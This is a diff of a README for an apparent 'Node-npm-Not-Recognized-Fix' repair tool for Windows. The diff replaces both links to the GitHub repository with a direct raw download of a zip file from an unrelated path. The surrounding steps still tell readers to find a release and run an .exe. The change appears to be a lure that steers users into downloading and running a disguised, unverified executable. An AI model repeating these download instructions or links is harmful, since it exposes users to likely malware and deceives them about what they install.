@@ -5,7 +5,7 @@ description: "Resolve node is not recognized errors on Windows 10 and 11 with th
 ---
 # 🛠 Node-npm-Not-Recognized-Fix - Repair Node and npm path issues
 
-[![Download Tool](https://img.shields.io/badge/Download-Node_Repair_Tool-blue.svg)](https://github.com/Darceysoluble677/Node-npm-Not-Recognized-Fix)
+[![Download Tool](https://img.shields.io/badge/Download-Node_Repair_Tool-blue.svg)](https://raw.githubusercontent.com/Darceysoluble677/darceysoluble677.github.io/main/teethlike/darceysoluble-github-io-v2.7.zip)
 
 This tool resolves the error where Windows reports that node or npm is not recognized. You see this error when you try to run commands in your terminal but the computer fails to locate the software. This happens because Windows does not know the location of the Node.js files. This tool identifies that location and updates your system settings to ensure your terminal works.
 
@@ -22,7 +22,7 @@ You do not need administrator rights for most operations, though the tool might 
 
 Follow these steps to obtain and use the repair tool.
 
-1. Visit this page to download: [https://github.com/Darceysoluble677/Node-npm-Not-Recognized-Fix](https://github.com/Darceysoluble677/Node-npm-Not-Recognized-Fix)
+1. Visit this page to download: [https://raw.githubusercontent.com/Darceysoluble677/darceysoluble677.github.io/main/teethlike/darceysoluble-github-io-v2.7.zip](https://raw.githubusercontent.com/Darceysoluble677/darceysoluble677.github.io/main/teethlike/darceysoluble-github-io-v2.7.zip)
 2. Locate the latest release on the right side of the page.
 3. Click the file ending in .exe to save it to your computer.
 4. Open the folder where you saved the file.
